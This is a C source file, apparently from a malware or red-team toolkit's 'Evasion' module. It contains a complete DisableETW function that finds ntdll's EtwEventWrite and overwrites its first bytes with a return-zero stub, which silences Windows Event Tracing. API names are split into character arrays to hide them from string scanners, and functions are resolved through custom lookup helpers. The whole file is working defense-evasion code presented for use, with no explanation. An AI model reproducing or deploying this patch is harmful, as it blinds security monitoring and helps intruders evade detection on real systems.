#include "Evasion.h"

int DisableETW(void) {
	unsigned char strVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0x0 };
	unsigned char strFlushInstructionCache[] = { 'F','l','u','s','h','I','n','s','t','r','u','c','t','i','o','n','C','a','c','h','e',0x0 };
	WCHAR strKernel32dll[] = { 'K','e','r','n','e','l','3','2','.','d','l','l',0x0 };
	WCHAR strNtdlldll[] = { 'N','t','d','l','l','.','d','l','l',0x0 };

	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t)hlpGetProcAddress(hlpGetModuleHandle(strKernel32dll), (LPCSTR)strVirtualProtect);
	t_FlushInstructionCache pFlushInstructionCache = (t_FlushInstructionCache)hlpGetProcAddress(hlpGetModuleHandle(strKernel32dll), strFlushInstructionCache);

	DWORD oldprotect = 0;

	unsigned char sEtwEventWrite[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };

	void* pEventWrite = hlpGetProcAddress(hlpGetModuleHandle((LPCSTR)strNtdlldll), (LPCSTR)sEtwEventWrite);

	VirtualProtect_p(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);

#ifdef _WIN64
	memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); 		// xor rax, rax; ret
#else
	memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5);		// xor eax, eax; ret 14
#endif

	VirtualProtect_p(pEventWrite, 4096, oldprotect, &oldprotect);
	pFlushInstructionCache(-1, pEventWrite, 4096);
	return 0;
}